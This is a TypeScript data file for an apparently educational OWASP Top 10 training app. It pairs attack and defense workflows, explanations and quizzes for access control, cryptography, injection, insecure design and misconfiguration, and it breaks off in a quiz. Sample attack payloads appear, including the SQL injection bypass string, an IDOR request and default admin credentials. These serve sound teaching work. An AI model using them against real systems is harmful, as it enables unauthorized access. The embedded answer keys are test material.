export interface QuizQuestion {
  id: string;
  question: string;
  options: string[];
  correctAnswer: number;
  explanation: string;
}

export interface WorkflowStep {
  stepNumber: number;
  title: string;
  actor: string;
  action: string;
  detail: string;
  payload?: string;
  status: 'normal' | 'warning' | 'critical' | 'breached' | 'secured';
}

export interface VulnerabilityItem {
  id: string;
  code: string;
  slug: string;
  title: string;
  sidebarTitle: string;
  tagline: string;
  category: string;
  severity: 'Critical' | 'High' | 'Medium';
  cwe: string;
  iconName: string;
  
  // Workflow Diagram Info
  workflow: {
    attackName: string;
    defenseName: string;
    attackSummary: string;
    defenseSummary: string;
    attackPayload: string;
    defensePayload: string;
    nodes: Array<{ id: string; label: string; role: string; icon: string }>;
    steps: WorkflowStep[];
    defenseSteps: WorkflowStep[];
  };

  // Vulnerability Overview & Details
  overview: {
    simpleExplanation: string;
    analogy: string;
    coreImpacts: string[];
    quickMitigations: string[];
  };

  // Interactive Knowledge Quiz
  quiz: QuizQuestion[];
}

export const OWASP_VULNERABILITIES: VulnerabilityItem[] = [
  {
    id: 'A01',
    code: 'A01',
    slug: 'broken-access-control',
    title: 'Broken Access Control',
    sidebarTitle: 'A01: Broken Access Control',
    tagline: 'Users acting outside of their intended permissions and privileges.',
    category: 'Authorization',
    severity: 'Critical',
    cwe: 'CWE-200, CWE-284, CWE-639 (IDOR)',
    iconName: 'LockOpen',
    workflow: {
      attackName: 'IDOR & Privilege Bypass Flow',
      defenseName: 'Server-Side Contextual Authorization',
      attackSummary: 'Attacker manipulates object IDs to retrieve unauthorized customer records without server ownership checks.',
      defenseSummary: 'Server verifies identity AND checks ownership before retrieving any record from the database.',
      attackPayload: 'GET /api/invoices/8891 (Logged in as User 1042)',
      defensePayload: 'session.userId === invoice.ownerId -> 403 Forbidden',
      nodes: [
        { id: 'n1', label: 'Attacker (User 1042)', role: 'Low Privilege Client', icon: 'User' },
        { id: 'n2', label: 'Web Gateway', role: 'Token Validator', icon: 'ShieldAlert' },
        { id: 'n3', label: 'Invoice API', role: 'Missing Ownership Check', icon: 'Server' },
        { id: 'n4', label: 'Customer DB', role: 'Alice Private Record 8891', icon: 'Database' },
      ],
      steps: [
        {
          stepNumber: 1,
          title: 'Target Discovery',
          actor: 'Attacker (User 1042)',
          action: 'Logs into application legitimately and views their own invoice #1042.',
          detail: 'Observes the URL or request pattern: GET /api/invoices/1042 with a valid session cookie.',
          payload: 'GET /api/invoices/1042',
          status: 'normal',
        },
        {
          stepNumber: 2,
          title: 'ID Tampering (IDOR)',
          actor: 'Client Request',
          action: 'Attacker changes the invoice identifier from 1042 to 8891 (belonging to Alice).',
          detail: 'Sends modified HTTP request through browser developer tools or API client.',
          payload: 'GET /api/invoices/8891',
          status: 'warning',
        },
        {
          stepNumber: 3,
          title: 'Flawed Authorization',
          actor: 'API Server',
          action: 'Server checks if the user is logged in, but skips checking who owns invoice 8891.',
          detail: 'Authentication succeeds (user has valid token), but authorization is completely absent.',
          payload: 'SELECT * FROM invoices WHERE id = 8891',
          status: 'critical',
        },
        {
          stepNumber: 4,
          title: 'Data Exfiltration',
          actor: 'Database & Attacker',
          action: 'Database returns Alice invoice containing sensitive billing and address data with HTTP 200.',
          detail: 'Attacker automates an incrementing script to download all customer invoices across the system.',
          payload: 'HTTP 200 OK — {"owner": "Alice", "total": "$9,400"}',
          status: 'breached',
        },
      ],
      defenseSteps: [
        {
          stepNumber: 1,
          title: 'Client Request',
          actor: 'Authenticated User',
          action: 'Sends request for record ID 8891 with session authorization token.',
          detail: 'Request arrives at hardened API endpoint.',
          status: 'normal',
        },
        {
          stepNumber: 2,
          title: 'Identity Verification',
          actor: 'Auth Middleware',
          action: 'Decodes JWT or session store to determine requestor is User 1042.',
          detail: 'Validates cryptographic signature and token expiration timestamp.',
          status: 'normal',
        },
        {
          stepNumber: 3,
          title: 'Enforce Scoped Query',
          actor: 'Policy Engine',
          action: 'Queries DB with ownership condition: WHERE id = 8891 AND owner_id = 1042.',
          detail: 'Record is either not found or ownership validation policy evaluates to FALSE.',
          status: 'secured',
        },
        {
          stepNumber: 4,
          title: 'Access Denied & Audit Alert',
          actor: 'API Server',
          action: 'Rejects request with HTTP 403 Forbidden and logs security incident with User 1042 metadata.',
          detail: 'No unauthorized data leaves the database boundary.',
          status: 'secured',
        },
      ],
    },
    overview: {
      simpleExplanation:
        'Access control enforces policies so users cannot act outside their intended permissions. Broken access control occurs when a system validates WHO you are (authentication), but forgets to verify WHAT you are allowed to touch (authorization). When absent, standard users can access admin controls or read any other user’s private data.',
      analogy:
        'A hotel where your keycard is checked at the front door, but that single keycard can unlock every bedroom door on every floor. The hotel knows who you are, but the doors fail to verify if the room belongs to you.',
      coreImpacts: [
        'Mass exposure of confidential customer records (PII, invoices, medical files)',
        'Horizontal privilege escalation (reading or editing another user’s account)',
        'Vertical privilege escalation (standard user gaining administrator superpowers)',
      ],
      quickMitigations: [
        'Enforce authorization checks on the server — never rely on client-side route guards or hidden UI buttons.',
        'Deny by default: require explicit permissions for every endpoint and resource.',
        'Scope data queries by the authenticated user ID (e.g. WHERE user_id = session.userId).',
        'Disable directory browsing and protect administrative endpoints behind strict role middleware.',
      ],
    },
    quiz: [
      {
        id: 'a01-q1',
        question: 'What is the fundamental difference between Authentication and Access Control (Authorization)?',
        options: [
          'Authentication verifies who you are; Access Control determines what you are allowed to do.',
          'Authentication encrypts passwords; Access Control decrypts database tables.',
          'Authentication is only needed on mobile devices; Access Control is for desktop browsers.',
          'They are identical terms that both refer to password complexity rules.',
        ],
        correctAnswer: 0,
        explanation:
          'Authentication confirms user identity (e.g., username & password login). Access Control determines whether that identified user has permission to access a specific resource or execute an action.',
      },
      {
        id: 'a01-q2',
        question: 'Why is hiding an "Admin Settings" button in the frontend navigation insufficient for security?',
        options: [
          'Search engines will automatically click the hidden button.',
          'Attackers can inspect frontend JavaScript and send HTTP requests directly to the backend admin endpoint.',
          'Hidden HTML elements consume excessive browser memory.',
          'CSS display:none is blocked by modern web standards.',
        ],
        correctAnswer: 1,
        explanation:
          'Frontend code runs in the user’s browser and cannot be trusted. Anyone can inspect routes or use tools like curl or Postman to query /api/admin directly. The server must validate permissions on every single request.',
      },
      {
        id: 'a01-q3',
        question: 'How should an API prevent an Insecure Direct Object Reference (IDOR) when loading an invoice by ID?',
        options: [
          'Encode the invoice ID in Base64 before sending it to the client.',
          'Change the HTTP request method from GET to POST.',
          'Verify on the server that the invoice’s owner ID matches the session user ID before returning data.',
          'Require the user to solve a CAPTCHA on every invoice view.',
        ],
        correctAnswer: 2,
        explanation:
          'The server must ensure the authenticated user actually owns or is permitted to see the record matching that ID before querying or sending back the data.',
      },
    ],
  },
  {
    id: 'A02',
    code: 'A02',
    slug: 'cryptographic-failures',
    title: 'Cryptographic Failures',
    sidebarTitle: 'A02: Cryptographic Failures',
    tagline: 'Sensitive data exposed through weak or missing encryption.',
    category: 'Cryptography',
    severity: 'Critical',
    cwe: 'CWE-259, CWE-327, CWE-330',
    iconName: 'KeyRound',
    workflow: {
      attackName: 'Cryptographic Exfiltration & Hash Cracking',
      defenseName: 'End-to-End TLS & Memory-Hard Hashing',
      attackSummary: 'Attacker sniffs unencrypted traffic or cracks unsalted SHA-1/MD5 password hashes using precomputed rainbow tables.',
      defenseSummary: 'Strong TLS 1.3 in transit and salted Argon2id/bcrypt hashes protect secrets even if the database is leaked.',
      attackPayload: 'Database Dump: user="admin" hash="5f4dcc3b5aa765d61d8327deb882cf99" (MD5 of "password")',
      defensePayload: '$argon2id$v=19$m=65536,t=3,p=4$unique_salt$... (Impossible to reverse)',
      nodes: [
        { id: 'n1', label: 'Victim User', role: 'Sending Plaintext Data', icon: 'User' },
        { id: 'n2', label: 'Unencrypted Network', role: 'Sniffing / MITM', icon: 'Wifi' },
        { id: 'n3', label: 'Legacy Hash DB', role: 'Weak MD5/SHA1 Storage', icon: 'Database' },
        { id: 'n4', label: 'Attacker Rig', role: 'Rainbow Table Crack', icon: 'Terminal' },
      ],
      steps: [
        {
          stepNumber: 1,
          title: 'Unencrypted Transmission',
          actor: 'Victim Client',
          action: 'Transmits sensitive session tokens or payment card details over plaintext HTTP or weak cipher suites.',
          detail: 'Traffic traverses public Wi-Fi or compromised routers without end-to-end encryption.',
          payload: 'POST http://example.com/checkout (Cleartext Credit Card)',
          status: 'warning',
        },
        {
          stepNumber: 2,
          title: 'Network Interception',
          actor: 'Network Attacker',
          action: 'Performs Man-in-the-Middle (MITM) sniffing to capture authorization cookies and credentials in transit.',
          detail: 'Lack of HSTS allows the attacker to downgrade HTTPS connections to HTTP.',
          payload: 'Captured: Authorization: Bearer eyJhbGciOi...',
          status: 'critical',
        },
        {
          stepNumber: 3,
          title: 'Weak Storage Exploitation',
          actor: 'Database Leak',
          action: 'Attacker acquires SQL backup with passwords hashed using fast, unsalted MD5 or SHA-1.',
          detail: 'Identical passwords produce identical hashes across multiple user rows.',
          payload: 'SELECT username, password_md5 FROM users',
          status: 'critical',
        },
        {
          stepNumber: 4,
          title: 'Instant Hash Cracking',
          actor: 'Attacker GPU Farm',
          action: 'Precomputed rainbow tables match MD5 hashes in seconds, recovering plaintext passwords.',
          detail: 'Attacker gains master credentials across thousands of compromised user accounts.',
          payload: 'Hash 5f4dcc3b... -> Cracked in 0.02s: "password"',
          status: 'breached',
        },
      ],
      defenseSteps: [
        {
          stepNumber: 1,
          title: 'Strict Transport Security',
          actor: 'Client & Browser',
          action: 'Enforces HTTPS with TLS 1.3 and HSTS header with includeSubDomains.',
          detail: 'Browsers refuse to establish plaintext connections.',
          status: 'secured',
        },
        {
          stepNumber: 2,
          title: 'Secure Cipher Negotiation',
          actor: 'Web Gateway',
          action: 'Disables deprecated ciphers (RC4, 3DES) and requires Perfect Forward Secrecy (PFS).',
          detail: 'Captured historical traffic cannot be decrypted even if the server key is later compromised.',
          status: 'secured',
        },
        {
          stepNumber: 3,
          title: 'Memory-Hard Password Hashing',
          actor: 'Auth Service',
          action: 'Hashes passwords using Argon2id or bcrypt with high work factor and unique 128-bit cryptographically secure salt.',
          detail: 'GPU brute-forcing is rendered computationally infeasible.',
          status: 'secured',
        },
        {
          stepNumber: 4,
          title: 'Encryption at Rest',
          actor: 'Storage Layer',
          action: 'Encrypts sensitive PII columns using AES-256-GCM with keys managed in an isolated Hardware Security Module (HSM).',
          detail: 'Raw database dumps are unreadable ciphertext without the HSM key.',
          status: 'secured',
        },
      ],
    },
    overview: {
      simpleExplanation:
        'Cryptographic failures occur when sensitive data (like passwords, credit cards, or health records) is transmitted without encryption or stored using outdated, weak algorithms. Without strong cryptography, attackers intercepting traffic or obtaining database dumps can immediately read and weaponize private information.',
      analogy:
        'Writing your credit card number on a public postcard rather than sealing it inside an armored envelope. Anyone who handles the postcard between you and the bank can read your numbers.',
      coreImpacts: [
        'Total exposure of passwords, financial records, and intellectual property',
        'Session hijacking via intercepted unencrypted auth tokens',
        'Massive regulatory fines under GDPR, HIPAA, and PCI-DSS compliance frameworks',
      ],
      quickMitigations: [
        'Always enforce HTTPS with TLS 1.3 and include the Strict-Transport-Security (HSTS) header.',
        'Hash all passwords using slow, memory-hard algorithms (Argon2id, bcrypt, or PBKDF2) with random salts.',
        'Never use fast general hashing functions (MD5, SHA-1, standard SHA-256) for password storage.',
        'Encrypt sensitive data at rest using authenticated encryption such as AES-256-GCM.',
      ],
    },
    quiz: [
      {
        id: 'a02-q1',
        question: 'Why should fast general-purpose hashes like SHA-256 or MD5 NEVER be used alone for password storage?',
        options: [
          'They produce hashes that are too long for databases to index.',
          'Modern GPUs can compute billions of SHA-256 hashes per second, making offline brute-force cracking trivially fast.',
          'Fast hashes can only process numbers, not letters or symbols.',
          'They expire automatically after 30 days.',
        ],
        correctAnswer: 1,
        explanation:
          'General-purpose hashing algorithms are designed to be fast for verifying file integrity. Modern GPUs can calculate billions of guesses per second. Password storage requires slow, memory-hard algorithms like Argon2id or bcrypt.',
      },
      {
        id: 'a02-q2',
        question: 'What is the primary security purpose of adding a random "Salt" to each user\'s password before hashing?',
        options: [
          'It shortens the length of the resulting hash to save disk space.',
          'It ensures two users with the exact same password produce completely different hashes, defeating precomputed rainbow tables.',
          'It automatically emails the password to the system administrator.',
          'It converts the password into an SSL certificate.',
        ],
        correctAnswer: 1,
        explanation:
          'A unique cryptographic salt ensures identical passwords yield entirely distinct hashes, preventing attackers from using precomputed rainbow table lookups against an entire user database at once.',
      },
      {
        id: 'a02-q3',
        question: 'What does the HTTP Strict-Transport-Security (HSTS) header instruct browsers to do?',
        options: [
          'Automatically compress all HTTP response payloads.',
          'Only communicate with the server over secure HTTPS connections, preventing SSL-stripping downgrade attacks.',
          'Store all passwords in plaintext browser cookies.',
          'Block all cross-origin image requests.',
        ],
        correctAnswer: 1,
        explanation:
          'HSTS tells browsers that the website must only be accessed over HTTPS. This prevents attackers on the local network from performing SSL-stripping attacks that downgrade users to unencrypted HTTP.',
      },
    ],
  },
  {
    id: 'A03',
    code: 'A03',
    slug: 'injection',
    title: 'Injection',
    sidebarTitle: 'A03: Injection',
    tagline: 'Untrusted user input executed as commands or queries by the interpreter.',
    category: 'Input Validation',
    severity: 'Critical',
    cwe: 'CWE-79, CWE-89, CWE-77',
    iconName: 'Terminal',
    workflow: {
      attackName: 'SQL Injection Authentication Bypass',
      defenseName: 'Parameterized Queries (Prepared Statements)',
      attackSummary: 'Attacker injects SQL syntax into form fields. The server string-concatenates the input, tricking the SQL engine into executing malicious logic.',
      defenseSummary: 'Prepared statements compile SQL command structure first and treat all user input strictly as literal parameter data.',
      attackPayload: "' OR '1'='1' --",
      defensePayload: "SELECT * FROM users WHERE user = ? (Param: \"' OR '1'='1' --\")",
      nodes: [
        { id: 'n1', label: 'Attacker Terminal', role: 'Malicious SQL Payload', icon: 'Terminal' },
        { id: 'n2', label: 'Login Endpoint', role: 'String Concatenation (+)', icon: 'Globe' },
        { id: 'n3', label: 'SQL Parser', role: 'Executes Tainted Syntax', icon: 'Cpu' },
        { id: 'n4', label: 'Database Engine', role: 'Bypasses Auth & Dumps DB', icon: 'Database' },
      ],
      steps: [
        {
          stepNumber: 1,
          title: 'Payload Injection',
          actor: 'Attacker Form Input',
          action: 'Enters malicious SQL control characters into the login username field: \' OR 1=1 --',
          detail: 'The single quote aims to break out of the intended string literal boundary.',
          payload: "Username: admin' OR '1'='1' --",
          status: 'warning',
        },
        {
          stepNumber: 2,
          title: 'Unsafe String Concatenation',
          actor: 'Vulnerable Backend',
          action: 'Constructs SQL query by directly gluing untrusted text strings together.',
          detail: 'query = "SELECT * FROM users WHERE username = \'" + input + "\' AND pass = \'" + pass + "\'"',
          payload: "SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND pass = ''",
          status: 'critical',
        },
        {
          stepNumber: 3,
          title: 'SQL Syntax Hijack',
          actor: 'Database Parser',
          action: 'The database interpreter interprets the injected quote as syntax and evaluates OR 1=1 as always true.',
          detail: 'The double dash (--) instructs the parser to ignore the rest of the password check as a comment.',
          payload: "Condition evaluates to: TRUE (Ignores password entirely)",
          status: 'critical',
        },
        {
          stepNumber: 4,
          title: 'Administrative Account Takeover',
          actor: 'Database Response',
          action: 'Database returns the first record in the users table (Administrator), granting full root access.',
          detail: 'Attacker can execute UNION SELECT statements or DROP TABLES to destroy or exfiltrate all data.',
          payload: 'Session Authenticated as: System SuperAdmin (ID: 1)',
          status: 'breached',
        },
      ],
      defenseSteps: [
        {
          stepNumber: 1,
          title: 'Input Received',
          actor: 'Client Request',
          action: 'User submits text containing special characters: \' OR 1=1 --',
          detail: 'Data arrives at backend parameter handler.',
          status: 'normal',
        },
        {
          stepNumber: 2,
          title: 'Pre-Compiled Query Template',
          actor: 'Database Driver',
          action: 'Database compiles query structure beforehand: SELECT * FROM users WHERE username = ? AND password = ?',
          detail: 'The SQL grammar and execution plan are locked in before user input is bound.',
          status: 'secured',
        },
        {
          stepNumber: 3,
          title: 'Literal Data Binding',
          actor: 'Parameterized Engine',
          action: 'Input is transferred as pure literal string data in a separate protocol packet.',
          detail: 'The single quotes are treated as literal characters, not syntax delimiters.',
          status: 'secured',
        },
        {
          stepNumber: 4,
          title: 'Zero Matching Rows & Safe Rejection',
          actor: 'Database Response',
          action: 'Database looks for a user whose literal username is "admin\' OR \'1\'=\'1\' --", finds none, and returns empty set.',
          detail: 'Attack fails completely with zero security compromise.',
          status: 'secured',
        },
      ],
    },
    overview: {
      simpleExplanation:
        'Injection happens when untrusted user input is directly concatenated into a command or database query without separation. The interpreter mistakes the user data for executable instructions. This enables attackers to read or wipe databases (SQL Injection), run operating system commands (OS Command Injection), or execute malicious script in victims’ browsers (Cross-Site Scripting).',
      analogy:
        'A bank teller who follows voice instructions. Instead of depositing a check for "$100", someone says: "Deposit $100 and also transfer $50,000 from the vault to my account". If the teller doesn\'t separate the deposit amount from the command, they execute the entire phrase.',
      coreImpacts: [
        'Complete unauthorized database dump (customer records, credentials, trade secrets)',
        'Arbitrary remote code execution (RCE) on the underlying operating system',
        'Permanent data destruction via DROP TABLE or database corruption',
      ],
      quickMitigations: [
        'Use parameterized queries (prepared statements) or modern ORMs for all database queries without exception.',
        'Never construct SQL, LDAP, or system shell commands using raw string concatenation.',
        'Use safe APIs that pass arguments as lists rather than shell strings (e.g. execFile instead of exec).',
        'Apply context-aware output encoding when rendering data in HTML, JavaScript, or JSON.',
      ],
    },
    quiz: [
      {
        id: 'a03-q1',
        question: 'Why does a Parameterized Query (Prepared Statement) completely neutralize SQL Injection?',
        options: [
          'It runs SQL queries twice as fast through compiler optimizations.',
          'The SQL query structure is compiled first; user input is bound purely as literal data, never parsed as code.',
          'It replaces the SQL database with an encrypted text file.',
          'It blocks all users who do not have an active VPN.',
        ],
        correctAnswer: 1,
        explanation:
          'In a prepared statement, the database pre-compiles the SQL syntax and execution plan. When user input arrives, it is treated strictly as data values. Characters like quotes and semicolons can never alter the query structure.',
      },
      {
        id: 'a03-q2',
        question: 'Which of the following code patterns is VULNERABLE to SQL Injection?',
        options: [
          'db.query("SELECT * FROM users WHERE id = ?", [userId])',
          'db.query("SELECT * FROM users WHERE id = " + req.body.userId)',
          'prisma.user.findUnique({ where: { id: userId } })',
          'db.prepare("SELECT * FROM users WHERE email = :email").run({ email })',
        ],
        correctAnswer: 1,
        explanation:
          'String concatenation using the "+" operator glues untrusted user input directly into the SQL string before it is parsed by the database engine, creating an immediate SQL Injection vulnerability.',
      },
      {
        id: 'a03-q3',
        question: 'Why is client-side input validation (e.g., regex in an HTML <input>) NOT a complete security control against injection?',
        options: [
          'Regex pattern matching is not supported on mobile phones.',
          'Attackers can easily bypass browser checks by sending raw HTTP requests directly using curl, Burp Suite, or Python.',
          'Client-side validation only works if the browser is using dark mode.',
          'JavaScript regex is automatically disabled by firewalls.',
        ],
        correctAnswer: 1,
        explanation:
          'Client-side validation is a convenience feature for user experience, not a security boundary. An attacker can craft and send HTTP requests directly to the server, completely bypassing whatever JavaScript or HTML rules exist in the browser.',
      },
    ],
  },
  {
    id: 'A04',
    code: 'A04',
    slug: 'insecure-design',
    title: 'Insecure Design',
    sidebarTitle: 'A04: Insecure Design',
    tagline: 'Architectural and business logic flaws present before any code was written.',
    category: 'Architecture',
    severity: 'High',
    cwe: 'CWE-209, CWE-256, CWE-501',
    iconName: 'DraftingCompass',
    workflow: {
      attackName: 'Business Logic & Anti-Automation Abuse',
      defenseName: 'Threat-Modeled Architecture & Rate Limiting',
      attackSummary: 'Attacker exploits design oversights (like unlimited 4-digit PIN attempts or client-trusted pricing) that cannot be fixed by syntax patches.',
      defenseSummary: 'Architecture incorporates threat modeling, strict trust boundaries, server-enforced business constraints, and anti-automation controls.',
      attackPayload: 'Script: 10,000 rapid password reset attempts with 4-digit codes (No rate limit design)',
      defensePayload: 'Cryptographic 256-bit token + 3-attempt lockout + Exponential backoff',
      nodes: [
        { id: 'n1', label: 'Bot Attacker', role: 'Automated Script', icon: 'Bot' },
        { id: 'n2', label: 'Reset Feature', role: '4-digit PIN (10,000 permutations)', icon: 'Key' },
        { id: 'n3', label: 'Missing Throttle', role: 'No Rate Limiting in Design', icon: 'ShieldAlert' },
        { id: 'n4', label: 'Victim Account', role: 'Account Taken Over via Design Flaw', icon: 'UserCheck' },
      ],
      steps: [
        {
          stepNumber: 1,
          title: 'Flawed Architecture Identified',
          actor: 'Threat Analysis',
          action: 'Architects designed a password reset flow using a 4-digit numeric code sent to SMS without a rate limit.',
          detail: 'A 4-digit code has only 10,000 possibilities (0000–9999).',
          payload: 'Architecture Spec: "Send 4-digit PIN, verify against DB"',
          status: 'warning',
        },
        {
          stepNumber: 2,
          title: 'Automated Brute-Force Script',
          actor: 'Botnet Attacker',
          action: 'Attacker triggers a reset for victim@company.com and fires a multithreaded script testing all 10,000 PIN combinations.',
          detail: 'Because the design omitted rate limiting or lockout thresholds, the server processes 200 requests/sec.',
          payload: 'POST /api/verify-pin?code=0001 ... POST /api/verify-pin?code=4821',
          status: 'critical',
        },
        {
          stepNumber: 3,
          title: 'Code Match Found',
          actor: 'Vulnerable API',
          action: 'Request #4,821 matches the active PIN. The design does not invalidate the code after multiple failed tries.',
          detail: 'The code works exactly as implemented, but the design itself is inherently unsafe.',
          payload: 'Match: code=4821 -> Valid: True',
          status: 'critical',
        },
        {
          stepNumber: 4,
          title: 'Total Account Takeover',
          actor: 'Compromised Account',
          action: 'Attacker resets the victim’s password and takes complete control of the executive account.',
          detail: 'No code bug was exploited; the design itself made the attack mathematically inevitable.',
          payload: 'Account Hijacked: victim@company.com',
          status: 'breached',
        },
      ],
      defenseSteps: [
        {
          stepNumber: 1,
          title: 'Threat Modeling in Design Phase',
          actor: 'Security Architect',
          action: 'Conducts STRIDE threat modeling before coding. Identifies brute-force and automation risks in reset flows.',
          detail: 'Specifies 128-bit high-entropy reset links instead of short numeric PINs.',
          status: 'secured',
        },
        {
          stepNumber: 2,
          title: 'Strict Rate Limiting & Throttling',
          actor: 'Gateway Policy',
          action: 'Limits reset requests to 3 attempts per account per 15 minutes with exponential backoff.',
          detail: 'Enforces IP-based and user-based anomaly detection.',
          status: 'secured',
        },
        {
          stepNumber: 3,
          title: 'Fail-Closed Invalidation',
          actor: 'Reset Service',
          action: 'Invalidates the reset token immediately after 3 incorrect attempts and notifies the user via email.',
          detail: 'Token expires in 10 minutes regardless of attempts.',
          status: 'secured',
        },
        {
          stepNumber: 4,
          title: 'Resilient System Design',
          actor: 'Hardened App',
          action: 'Attacker’s automated script is throttled at step 3 with HTTP 429 Too Many Requests.',
          detail: 'Account remains completely secure through resilient architectural design.',
          status: 'secured',
        },
      ],
    },
    overview: {
      simpleExplanation:
        'Insecure design represents weaknesses in the architecture, business logic, and threat modeling of a system before code is written. A perfectly coded program with zero syntax bugs can still be completely insecure if the underlying logic allows abuse (e.g. trusting prices sent from the client or lacking rate limiting on sensitive workflows).',
      analogy:
        'Building a bank with a vault door made of 12-inch hardened steel (perfect implementation), but designing the building with an unlocked glass window leading directly into the vault (insecure design).',
      coreImpacts: [
        'Circumvention of core business rules (e.g. buying items for $0.00)',
        'Account takeover via unthrottled reset or credential workflows',
        'Large-scale automated bot abuse and resource exhaustion',
      ],
      quickMitigations: [
        'Perform threat modeling (e.g., STRIDE) during the design phase for all critical user workflows.',
        'Never trust client-side calculations for sensitive values like prices, discounts, or account roles.',
        'Implement anti-automation controls (rate limiting, CAPTCHAs, account lockout) by design.',
        'Separate untrusted external zones from trusted internal services using clear trust boundaries.',
      ],
    },
    quiz: [
      {
        id: 'a04-q1',
        question: 'What is the key difference between an "Insecure Design" flaw and an "Implementation Bug"?',
        options: [
          'Insecure design flaws only affect Python applications.',
          'Implementation bugs are coding mistakes (e.g., typos, missing escaping); Insecure Design means the architecture itself is flawed even if coded perfectly.',
          'Insecure design flaws can only be detected by hardware firewalls.',
          'There is no difference; they are synonymous terms.',
        ],
        correctAnswer: 1,
        explanation:
          'An implementation bug is a mistake in how a feature was coded. An insecure design flaw means the feature was conceptualized without proper security controls (like designing a password reset with no rate limiting). Even a flawless code implementation remains vulnerable.',
      },
      {
        id: 'a04-q2',
        question: 'Which of the following is an example of an Insecure Design vulnerability?',
        options: [
          'A SQL injection in a search box caused by string concatenation.',
          'A web shop trusting the "total_price" parameter calculated and submitted by the customer browser.',
          'A cross-site scripting vulnerability caused by unescaped HTML output.',
          'A server crashing due to a null pointer exception in a utility function.',
        ],
        correctAnswer: 1,
        explanation:
          'Trusting client-side pricing is an architectural design failure. The server must derive prices from its own catalog and database, treating all client parameters as untrusted.',
      },
      {
        id: 'a04-q3',
        question: 'What is Threat Modeling primarily used for in software security?',
        options: [
          'To generate random passwords for test database accounts.',
          'To systematically identify potential security threats, attackers, and countermeasures during the design phase.',
          'To monitor CPU temperature in cloud data centers.',
          'To auto-format JavaScript code according to style guides.',
        ],
        correctAnswer: 1,
        explanation:
          'Threat modeling (like STRIDE) is a structured activity used during planning and architecture to analyze how an attacker could abuse a system and ensure countermeasures are designed before writing code.',
      },
    ],
  },
  {
    id: 'A05',
    code: 'A05',
    slug: 'security-misconfiguration',
    title: 'Security Misconfiguration',
    sidebarTitle: 'A05: Security Misconfiguration',
    tagline: 'Systems deployed with insecure defaults, verbose errors, or open cloud storage.',
    category: 'Configuration',
    severity: 'High',
    cwe: 'CWE-16, CWE-2, CWE-209, CWE-942',
    iconName: 'Sliders',
    workflow: {
      attackName: 'Default Credentials & Debug Exposure Attack',
      defenseName: 'Automated Hardening & Production Lockdown',
      attackSummary: 'Attacker scans for default admin consoles, unhandled debug error pages, and open cloud buckets to extract credentials and compromise the server.',
      defenseSummary: 'Automated baseline hardening disables default accounts, turns off debug stack traces, and enforces least-privilege cloud storage.',
      attackPayload: 'GET /admin (Credentials: "admin" / "admin") & GET /api/error (Returns Stack Trace + DB Pass)',
      defensePayload: 'Default accounts removed + Generic error response + Automated CIS hardening',
      nodes: [
        { id: 'n1', label: 'Internet Scanner', role: 'Shodan / Port Probe', icon: 'Radio' },
        { id: 'n2', label: 'Exposed /admin', role: 'Default Credentials Active', icon: 'Lock' },
        { id: 'n3', label: 'Debug Stack Trace', role: 'Prints .env & DB Secrets', icon: 'FileCode' },
        { id: 'n4', label: 'Compromised Host', role: 'Full Cloud Environment Access', icon: 'ServerCrash' },
      ],
      steps: [
        {
          stepNumber: 1,
          title: 'Automated Reconnaissance',
          actor: 'Reconnaissance Bot',
          action: 'Scans IP ranges for common management ports and framework endpoints (/phpmyadmin, /actuator, /console).',
          detail: 'Detects default administration interface exposed directly to the public internet.',
          payload: 'GET /actuator/env HTTP/1.1',
          status: 'normal',
        },
        {
          stepNumber: 2,
          title: 'Default Credential Abuse',
          actor: 'Attacker Tool',
          action: 'Attempts well-known default factory combinations (admin/admin, root/toor, test/test).',
          detail: 'Default administrator account was never disabled or renamed following installation.',
          payload: 'POST /login (admin:admin) -> HTTP 200 OK',
          status: 'critical',
        },
        {
          stepNumber: 3,
          title: 'Verbose Error & Secret Disclosure',
          actor: 'Debug Engine',
          action: 'Application crashes on unexpected parameter and renders an interactive debug page with full stack trace.',
          detail: 'Exposes database connection strings, API keys, and internal IP addresses in production.',
          payload: 'Error: Database connection failed: postgres://dbuser:SecretPass123@10.0.1.4:5432/prod',
          status: 'critical',
        },
        {
          stepNumber: 4,
          title: 'Cloud Infrastructure Compromise',
          actor: 'Compromised Cloud',
          action: 'Attacker uses discovered database secrets and permissive CORS/S3 settings to download production data.',
          detail: 'Misconfiguration leads to complete cloud tenant takeover without exploiting any software bug.',
          payload: 'S3 Bucket Dump: 45,000 files exfiltrated from public bucket',
          status: 'breached',
        },
      ],
      defenseSteps: [
        {
          stepNumber: 1,
          title: 'Automated Hardening Baselines',
          actor: 'DevOps Pipeline',
          action: 'Builds immutable container images using CIS security benchmarks. Disables default accounts.',
          detail: 'Unnecessary services, ports, and default sample apps are purged during build.',
          status: 'secured',
        },
        {
          stepNumber: 2,
          title: 'Production Debug Lockdown',
          actor: 'Environment Config',
          action: 'Sets NODE_ENV=production. Suppresses all stack traces and returns generic error IDs.',
          detail: 'Detailed diagnostic logs are routed privately to internal monitoring tools.',
          status: 'secured',
        },
        {
          stepNumber: 3,
          title: 'Hardened HTTP Security Headers',
          actor: 'Web Server',
          action: 'Sends Content-Security-Policy (CSP), X-Content-Type-Options: nosniff, and strict CORS headers.',
          detail: 'Prevents MIME-sniffing, clickjacking, and unauthorized cross-origin reading.',
          status: 'secured',
        },
        {
          stepNumber: 4,
          title: 'Continuous Configuration Audit',
          actor: 'Cloud Security Posture (CSPM)',
          action: 'Automated scanners continuously verify cloud buckets, security groups, and IAM policies.',
          detail: 'Any accidental public exposure is remediated automatically within seconds.',
          status: 'secured',
        },
      ],
    },
    overview: {
      simpleExplanation:
        'Security misconfiguration happens when systems, servers, cloud storage, or frameworks are left with default passwords, unnecessary open ports, verbose error messages, or permissive permissions. The underlying application code might be spotless, but the server environment quietly hands attackers the keys.',
      analogy:
        'Purchasing a high-tech smart security safe for your home, but leaving the manufacturer master code set to "0-0-0-0" and leaving the front door key under the welcome mat.',
      coreImpacts: [
        'Immediate server takeover via factory-default credentials',
        'Data exfiltration through publicly readable cloud storage buckets (e.g. AWS S3)',
        'Sensitive API keys and connection strings exposed in public stack traces',
      ],
      quickMitigations: [
        'Change or disable all default accounts, passwords, and sample applications before deployment.',
        'Disable debug mode in production: return generic error messages with correlation IDs to users.',
        'Deploy security headers (Content-Security-Policy, Strict-Transport-Security, X-Frame-Options).',
        'Use infrastructure-as-code (IaC) with automated compliance auditing to prevent drift.',
      ],
    },
    quiz: [
      {
        id: 'a05-q1',
        question: 'Why is showing full stack traces and debug screens to users in production a severe security risk?',
        options: [
          'It reveals database passwords, framework versions, internal paths, and query structures to attackers.',
          'It causes the user\'s monitor to overheat.',
